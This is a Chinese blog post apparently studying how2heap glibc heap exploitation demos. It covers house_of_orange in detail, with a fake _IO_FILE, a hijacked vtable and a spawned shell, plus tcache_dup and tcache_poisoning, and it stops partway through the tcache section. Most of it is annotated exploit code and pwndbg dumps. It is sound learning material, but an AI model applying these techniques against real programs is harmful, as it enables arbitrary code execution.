---
title: how2heap-5
date: 2019-07-19 23:17:18
tags: pwn
---

# how2heap - 5

<!--more-->

## house_of_orange

Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution

### 解释

> House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free函数情况下获取到 unsorted bins。

> 我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 sysmalloc() 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 mp_.mmap_threshold：

``` c
if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))
```

> 如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。

> 为了能够调用 sysmalloc() 中的 _int_free()，需要 top chunk 大于 MINSIZE，即 0x10

> 当然，还得绕过下面两个限制条件：

``` c
/*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

> 即满足 old_size 小于 nb+MINSIZE，PREV_INUSE 标志位为 1，old_top+old_size 页对齐这几个条件。

> 我们总结一下伪造的top chunk size的要求
> 1. 伪造的size必须要对齐到内存页
> 2. size 要大于 MINSIZE(0x10)
> 3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
> 4. size 的 prev inuse 位必须为1
> 之后原有的top chunk就会执行_int_free从而顺利进入unsorted bin中。

``` c
    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);
```

首先 malloc 一个 0x400 大小的 chunk：

```
pwndbg> heap
0x602000 PREV_INUSE {
  prev_size = 0, 
  size = 1025,    // 0x401
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

通常情况下 ，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。

```
pwndbg> top_chunk 
0x602400 PREV_INUSE {
  prev_size = 0, 
  size = 134145,    // 0x20c01
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/20gx 0x602400
0x602400:	0x0000000000000000	0x0000000000020c01  <-- Top Chunk size, prev_inuse
0x602410:	0x0000000000000000	0x0000000000000000
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x0000000000000000
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
```

此时我们假设有溢出漏洞：

``` c
    /*
       The heap is usually allocated with a top chunk of size 0x21000
       堆的top chunk一般是0x21000
       Since we've allocate a chunk of size 0x400 already,
       如果我们已经申请了一个大小为 0x400 的chunk
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.
       这样会剩下一个0x20c00大小的chunk且PREV_INUSE bit被设置，所以值为0x20c01

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       堆的边界是页面对齐的。因为 Top chunk 已经是堆上的最后一个 chunk了，它最后也应该是对齐的。
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       而且，如果一个临近Top chunk的chunk被free的话，它会被合并进 top chunk中。
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
       Top chunk的PREV_INUSE bit也会被设置。

       So that means that there are two conditions that must always be true.
       这也意味着这两种情况一定是对的：
        1) Top chunk + size has to be page aligned
        Top chunk + size 一定是按页对齐的
        2) Top chunk's prev_inuse bit has to be set.
        Top chunk 的 PREV_INUSE 位一定是被设置的

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       我们可以通过设置Top chunk的size为0xc00|PREV_INUSE满足这两个条件
       What's left is 0x20c01


       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;
```

此时 top chunk 的 size 被修改为 0xc01，满足了上面的条件。

```
pwndbg> x/20gx 0x602400
0x602400:	0x0000000000000000	0x0000000000000c01
0x602410:	0x0000000000000000	0x0000000000000000
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x0000000000000000
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
```

接下来我们申请了一个 0x1000 的 chunk：

``` c
    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       现在我们申请了一个比Top chunk大的 chunk
       Malloc tries to service this request by extending the Top chunk
       Malloc 会尝试扩展 Top chunk 满足这一要求
       This forces sysmalloc to be invoked.
       这会强制调用 sysmalloc

       In the usual scenario, the heap looks like the following
       在通常情况下，堆看起来如下所示：
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       新的 area 会在旧的堆后面 get allocated
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
       所以Top chunk 的新 size是旧的size和新申请的size之和。

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       为了跟踪这种大小的变化，malloc使用了fencepost chunk，这是一种临时块。
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.
       在Top chunk的大小被更新的时候，这个chunk就会被free掉。

       In our scenario however, the heap looks like
       在我们这种情况下，heap看起来是这样的：
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       在这种情况下，新的 Top 将会从靠近堆结束的地方开始
       So the area between the second chunk and the heap end is unused.
       所以在第二个chunk和堆结束之间的area是未使用状态的。
       And the old Top chunk gets freed.
       而旧的Top chunk会被free掉
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       由于我们free掉的这个Top chunk的size大于fastbin的size，它会被放入unsorted bins中。
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       现在我们需要请求一个比top chunk的大小大的 chunk。
       This forces sysmalloc to be invoked.
       这会强制调用 sysmalloc。
       And ultimately invokes _int_free
       最后会调用 _int_free。

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
```

0x1000 > 0xc01，又由于 top chunk 的伪造满足条件，原有的 top chunk 会被放入 unsorted bins 中：

```
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400
smallbins
empty
largebins
empty
```

此时堆的情况如下：

```
pwndbg> x/4gx p1-0x10+0x400
0x602400:	0x0000000000000000	0x0000000000000be1    <-- old Top chunk
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
pwndbg> x/4gx p1-0x10+0x400+0xbe0
0x602fe0:	0x0000000000000be0	0x0000000000000010    <-- fencepost chunk 1
0x602ff0:	0x0000000000000000	0x0000000000000011    <-- fencepost chunk 2
pwndbg> x/4gx p2-0x10
0x623000:	0x0000000000000000	0x0000000000001011    <-- chunk p2
0x623010:	0x0000000000000000	0x0000000000000000
pwndbg> x/4gx p2-0x10+0x1010
0x624010:	0x0000000000000000	0x0000000000020ff1    <-- new Top chunk
0x624020:	0x0000000000000000	0x0000000000000000
```

可以看出，old top chunk 的大小由0xc00变为了0xbe0，缩小了0x20，这个缩小的空间被用来放置 fencepost chunk。

``` c
    /*
      Note that the above chunk will be allocated in a different page
      注意到上面的chunk将被分配到一个被mmap的不同页面中，
      that gets mmapped. It will be placed after the old heap's end
      它会被放置在旧的堆的后面。
      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
      现在我们有一块被释放的 old top chunk，它已经加入看unsorted bins list中

      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      接下来开始第二段攻击。我们假设可以通过溢出覆盖old top chunk 的size。
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      在第二阶段我们再次利用这个溢出以覆盖 unsorted bin list中这一块的fd和bk指针。
      There are two common ways to exploit the current state:
      利用当前的状态有两种方法：
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        通过设置相应指针实现任意地址的分配（需要至少分配两次）
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)
        使用 chunk 的 unlink 来进行libc 的 main arena unsorted-bin-list 的控制写入（需要至少一次分配）

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.
      之前那种攻击很容易被利用，所以我们会详细说明后者的变体，由 Angelboy 的上面的博客链接开发。

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      这个攻击的效果非常惊人，它是利用终止调用本身进行的攻击。当libc检测到了任何虚假状态时就能触发。

      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.
      一旦触发了 trigger，它会通过调用 _IO_flush_all_lockp 清空所有的文件指针。最后，遍历 _IO_list_all 的列表并调用其中的 _IO_OVERFLOW。

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      我们的想法是用一个 fake 文件指针覆盖 _IO_list_all 的指针，它的 _IO_OVERFLOW 指向 system，前 8 个字节设置为 `/bin/sh` ，因此调用 `_IO_OVERFLOW(fp, EOF)` 的操作会被翻译成 `system('/bin/sh')`
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
      _IO_list_all 的地址可以通过被释放的chunk的 fd 和 bk 计算，它们现在指向的是 libc 的 main_area
    */
    io_list_all = top[2] + 0x9a8;
```

这样我们能推出 io_list_all 的地址：

```
pwndbg> p/x io_list_all 
$3 = 0x7ffff7dd2520
pwndbg> x/20xg 0x7ffff7dd2520
0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd2540	0x0000000000000000
0x7ffff7dd2530:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2540 <_IO_2_1_stderr_>:	0x00000000fbad2887	0x00007ffff7dd25c3
0x7ffff7dd2550 <_IO_2_1_stderr_+16>:	0x00007ffff7dd25c3	0x00007ffff7dd25c3
0x7ffff7dd2560 <_IO_2_1_stderr_+32>:	0x00007ffff7dd25c3	0x00007ffff7dd25c3
0x7ffff7dd2570 <_IO_2_1_stderr_+48>:	0x00007ffff7dd25c3	0x00007ffff7dd25c3
0x7ffff7dd2580 <_IO_2_1_stderr_+64>:	0x00007ffff7dd25c4	0x0000000000000000
0x7ffff7dd2590 <_IO_2_1_stderr_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd25a0 <_IO_2_1_stderr_+96>:	0x0000000000000000	0x00007ffff7dd2620
0x7ffff7dd25b0 <_IO_2_1_stderr_+112>:	0x0000000000000002	0xffffffffffffffff
```

``` c
    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.
      我们计划覆盖在旧的 top chunk 上的现在被加入 unsorted bins 的 fd 和 bk。

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.
      当 malloc 试图通过拆分这个 free chunk 满足请求时，chunk->bk->fd 的值会被 libc 中的 main_arena 中的 unsorted-bin-list 的地址所覆盖。

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.
      注意，这个覆盖发生在完整性检查之前，因此任何情况下都会发生。

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      在这里，我们请求 chunk->bk->fd 的值为 _IO_list_all。
      So, we should set chunk->bk to be _IO_list_all - 16
      因此，我们需要设置 chunk->bk 为 _IO_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;
```

修改前：

```
pwndbg> x/20gx top - 2
0x602400:	0x0000000000000000	0x0000000000000be1
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78    <-- fd, bk
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
```

修改后：

```
pwndbg> x/10gx top
0x602400:	0x0000000000000000	0x0000000000000be1
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510    <-- fd, bk
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
```

此时的堆：

```
0x602400 PREV_INUSE {
  prev_size = 0, 
  size = 3041, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd2510, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

> 这里，会顺便涉及到 glibc 的异常处理.
> 一般在出现内存错误时，会调用函数 malloc_printerr() 打印出错信息

``` c
static void
malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
{
  [...]
  if ((action & 5) == 5)
    __libc_message (action & 2, "%s\n", str);
  else if (action & 1)
    {
      char buf[2 * sizeof (uintptr_t) + 1];

      buf[sizeof (buf) - 1] = '\0';
      char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0);
      while (cp > buf)
        *--cp = '0';

      __libc_message (action & 2, "*** Error in `%s': %s: 0x%s ***\n",
                      __libc_argv[0] ? : "<unknown>", str, cp);
    }
  else if (action & 2)
    abort ();
}
```

当调用 `__libc_message` 时：

``` c
// sysdeps/posix/libc_fatal.c
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
  [...]
  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}
```

`do_abort` 调用 `fflush`，即 `_IO_flush_all_lockp`：

``` c
// stdlib/abort.c
#define fflush(s) _IO_flush_all_lockp (0)

  if (stage == 1)
    {
      ++stage;
      fflush (NULL);
    }

// libio/genops.c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;   // 将其覆盖
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)     // 将其修改为 system 函数
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain;    // 指向我们指定的区域
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

> _IO_list_all 是一个 _IO_FILE_plus 类型的对象，我们的目的就是将 _IO_list_all 指针改写为一个伪造的指针，它的 _IO_OVERFLOW 指向 system，并且前 8 字节被设置为 '/bin/sh'，所以对 _IO_OVERFLOW(fp, EOF) 的调用最终会变成对 system('/bin/sh') 的调用。

``` c
    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      最后，我们用指向这个文件指针的指针调用 system 函数
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
      如果我们将前 8 个字节填充为 /bin.sh，它等价于调用 system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);
```

于是 old top chunk 被修改为：

```
pwndbg> x/10gx top
0x602400:	0x0068732f6e69622f	0x0000000000000be1
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
pwndbg> x/2s top 
0x602400:	"/bin/sh"
0x602408:	"\341\v"
```

``` c
    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      _IO_flush_all_lockp 函数会遍历 _IO_list_all 中的文件指针 linked-list
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      由于我们只能使用 main_arena 中的 unsorted-bin-list 覆盖这个地址，因此我们的想法时控制相应的 fd-ptr 的内存。
      The address of the next file pointer is located at base_address+0x68.
      下一个文件指针的位置在 base_address + 0x68 处。
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
      这一块对应于 smallbin - 4，它包含所有大小在 90 到 98 之间的 smallbins。

      Since we overflow the old top chunk, we also control it's size field.
      如果我们溢出了旧的 top chunk，我们页控制了它的 size 位。
      Here it gets a little bit tricky, currently the old top chunk is in the
      这里给出一种稍微有趣的方法，现在 old top chunk 还在 unsortedbin list 中。
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      对于每一个申请， malloc 都会试图首先用这个 list 中的 chunk，因此会先遍历一遍这个列表。
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      此外，它会将所有没被分配的块分配到相应的 bins 列表中。
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      入伏哦我们将 size 设为 0x61，并且触发了未分配的小块的分配方式，malloc 会将旧的 chunk 放在 smallbin-4 中。
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      因为这个 bin list 现在是空的，旧的 top chunk 是新的首部，因此，会占据 main_arena 中的 smallbin[4] 的位置并最终表示一个伪文件指针的 fd-ptr。
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      除了排序之外，malloc 还会对它们执行一定的大小检查。因此在排序旧的 top chunk 并循着伪造的 fd 指针到 _IO_list_all 后，它会检查相应的大小字段，检测的大小 MINSIZE "size <= 2 * SIZE_SZ" 最终触发中止调用，使我们构造的调用链执行。
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;
```

``` c
    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
      现在我们要满足函数 _IO_flush_all_lockp 所需的 fake 文件指针约束并且在这里测试的部分：

      We want to satisfy the first condition:
      我们希望首先满足这个条件：
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;

    /*
      1. Set mode to 0: fp->_mode <= 0
      1. 设置模式为 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
      2. 设置 write_base 为 2，write_ptr 为 3：
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /* 
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the _IO_FILE struct:
      base_address+sizeof(_IO_FILE) = jump_table
      最终设置跳转地址以控制内存并放置 system。跳转地址的指针在 _IO_FILE 结构体后面：
      base_address + sizeof(_IO_FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
         控制 _IO_OVERFLOW 调用指针在 offset 3 处：jump_table + 0x18 为需要的函数地址
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
```

修改后的 old top chunk 内存：

```
pwndbg> x/30gx top
0x602400:	0x0068732f6e69622f	0x0000000000000061
0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd2510
0x602420:	0x0000000000000002	0x0000000000000003
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x000000000040078f
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
0x6024a0:	0x0000000000000000	0x0000000000000000
0x6024b0:	0x0000000000000000	0x0000000000000000
0x6024c0:	0x0000000000000000	0x0000000000000000
0x6024d0:	0x0000000000000000	0x0000000000602460
0x6024e0:	0x0000000000000000	0x0000000000000000
```

用 `_IO_FILE_plus *` 读取 old top chunk：

```
pwndbg> p *((struct _IO_FILE_plus *) 0x602400)
$7 = {
  file = {
    _flags = 1852400175, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0x7ffff7dd1b78 <main_arena+88> "\020@b", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, 
    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0, 
    _flags2 = 0, 
    _old_offset = 4196239, 
    _cur_column = 0, 
    _vtable_offset = 0 '\000', 
    _shortbuf = "", 
    _lock = 0x0, 
    _offset = 0, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x602460
}
```

``` c
    /* Finally, trigger the whole chain by calling malloc */
    // 最后随便申请一个内存以触发整个调用链，这也会获得shell。
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */
```

报错信息：

```
*** Error in `/mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange': malloc(): memory corruption: 0x00007ffff7dd2520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff7a847e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7ffff7a8f13e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a91184]
/mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange[0x400788]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
/mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange[0x400589]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:31 767                                /mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange
00600000-00601000 r--p 00000000 00:31 767                                /mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange
00601000-00602000 rw-p 00001000 00:31 767                                /mnt/hgfs/VMShare/how2heap/glibc_2.25/house_of_orange
00602000-00645000 rw-p 00000000 00:00 0                                  [heap]
7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 
7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 
7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 
7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[New process 9273]
process 9273 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No source file named glibc_2.25/house_of_orange.c.
[New process 9274]
process 9274 is executing new program: /bin/dash
$ 
```

## tcache_dup

Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist.

### 解释

tcache 的利用方法和介绍可以参考这里：

[4.14 glibc tcache 机制](https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html)

[Tcache Attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)

这里是一个简单的例子，用了 tcache 之后连 double free 都变得方便了 XD

首先申请一个 tcache a，然后连续 free 两次。此时 free list 中包含两个被 free 的 a 的地址：

```
tcachebins
0x20 [  2]: 0x8402260 ◂— 0x8402260                                                                    fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty 
```

正是输出：

```
Now the free list has [ 0x8402260, 0x8402260 ].
```

接下来如果申请两次 tcache 大小的内存的话会被分配到相同的地址。

## tcache_poisoning

Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist.
通过滥用 tcache freelist 欺骗 malloc 返回完全任意的指针。

### 解释

这个文件通过欺骗 malloc 返回任意地址的指针（本例中为堆栈）来演示一个简单的 tcache_poisoning 攻击。这个攻击和 fastbin corruption 攻击类似。

首先得到我们希望 malloc 返回的地址。

```
pwndbg> p/x &stack_var
$2 = 0x7ffffffedd98
```

然后 `malloc(128)` 并释放掉。

此时的 bins：

```
pwndbg> bins
tcachebins
0x90 [  1]: 0x8402260 ?— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

接下来覆盖被释放的指针 a 的前 8 个字节（fd->next 指针）指向我们要控制的位置（stack_var）

``` c
a[0] = (intptr_t)&stack_var;
```

修改后：

```
pwndbg> x/10gx a
0x8402260:      0x00007ffffffedd98      0x0000000000000000
0x8402270:      0x0000000000000000      0x0000000000000000
0x8402280:      0x0000000000000000      0x0000000000000000
0x8402290:      0x0000000000000000      0x0000000000000000
0x84022a0:      0x0000000000000000      0x0000000000000000
```

此时的 tcachebins：

